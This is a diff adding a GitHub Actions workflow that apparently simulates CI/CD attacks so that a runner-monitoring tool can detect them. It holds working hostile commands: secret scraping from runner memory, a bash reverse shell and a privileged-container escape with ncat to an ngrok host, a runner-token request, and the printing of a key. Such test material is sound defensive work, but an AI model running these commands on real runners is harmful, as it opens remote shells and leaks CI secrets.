@@ -1,0 +1,83 @@
+name: Workflow for POCs
+on:
+  workflow_dispatch:
+
+jobs:
+  tj-actions-simulation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: prateek-stepsecurity/harden-runner@int
+        with:
+         egress-policy: audit
+     
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Execute tj-action
+        run: | 
+          sudo python3 tj.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0
+  pytorch-simulation:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: prateek-stepsecurity/harden-runner@int
+      with:
+         egress-policy: audit
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Generate a registration token for attacker repo
+      run: |
+          response=$(curl -X POST -H "Authorization: token github_pat_dummy_token" \
+          -H "Accept: application/vnd.github.v3+json" \
+          https://api.github.com/repos/step-security-experiments/github-actions-goat/actions/runners/registration-token)
+  reverse-shell: 
+    runs-on: ubuntu-latest
+    steps:
+      - uses: prateek-stepsecurity/harden-runner@int
+        with:
+          egress-policy: audit
+
+      - name: Reverse shell
+        run: |
+          bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1"
+  privileged-conatiner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: prateek-stepsecurity/harden-runner@int
+        with:
+          egress-policy: audit
+
+      - name: Dind escape
+        run: |
+          docker run --privileged --cap-add=ALL -v /:/host raesene/ncat:latest 0.tcp.us-cal-1.ngrok.io 17658 -e /bin/bash
+  handle-private-key:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - uses: prateek-stepsecurity/harden-runner@int
+      with:
+         egress-policy: audit
+    - name: Checkout code
+      uses: actions/checkout@v3
+    
+    - name: Decode and print private key
+      env:
+        # This is a base64 encoded dummy private key (NOT A REAL KEY)
+        # In production, this should be stored in GitHub Secrets
+        ENCODED_PRIVATE_KEY: |
+          LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tTUlJRXZnSUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NCS2d3Z2dTa0FnRUFBb0lCQVFDN1ZKVFV0OVVzOGNLagpNekVmWXlqaVdBNFI0L00yYlMxR0I0dDdOWHA5OEMzU0M2ZFZNdkR1aWN0R2V1clQ4ak5idkpaSHRDU3VZRWNONXI0RQpKV25YaXNLNVkrVHYra1pnWlBtNXdRQTB3MVd1cGZhUlZQUGhoR2dUN1daeEM3UFJMTjIvaUo5dDJRTGloNzlEMFF1ZwpINFE3clB3SVVDdzdOYjJYSVpHc1VYSzJhZmlJM24vT1NQSHVRR0dCRnhIcWI3VWwzM3lJdUN4UjBJcTVuem1RTENFVApSYm5pRzRoeE5aMEo3a3hwZzdtWk5LQ1JKd0NRSFl0SEhxVVVOTGl4Q01TNDU1cWo5SUhJTVYwbEc0NFhLWEV6U0oxWgpjajZuQ1B6aFJtUXBDd2p0MWJJT0NWU0VKMUppU204YTVTdUpLRkxtQWlVTmtsZnJOckdEMjN1RUlRSURBUUFCQW9JQgpBQUh0QmJZcDBBdzVOTi9lV0ROUDVuekZFYVhSWmM3QUNuc3BQN1VFSUZZeDkrNW5BU1pnc0l1ZUh4VlpiZ25QTTl6RQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0t
+      run: |
+        echo "Decoding private key..."
+        echo "$ENCODED_PRIVATE_KEY" | base64 -d > private_key.pem
+        
+        echo "Private key content:"
+        cat private_key.pem
+  imposter-commit:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - uses: prateek-stepsecurity/harden-runner@int
+      with:
+         egress-policy: audit
+    - name: Checkout code
+      uses: actions/checkout@v3
+    - uses: step-security/dummy-compromised-action@v1  
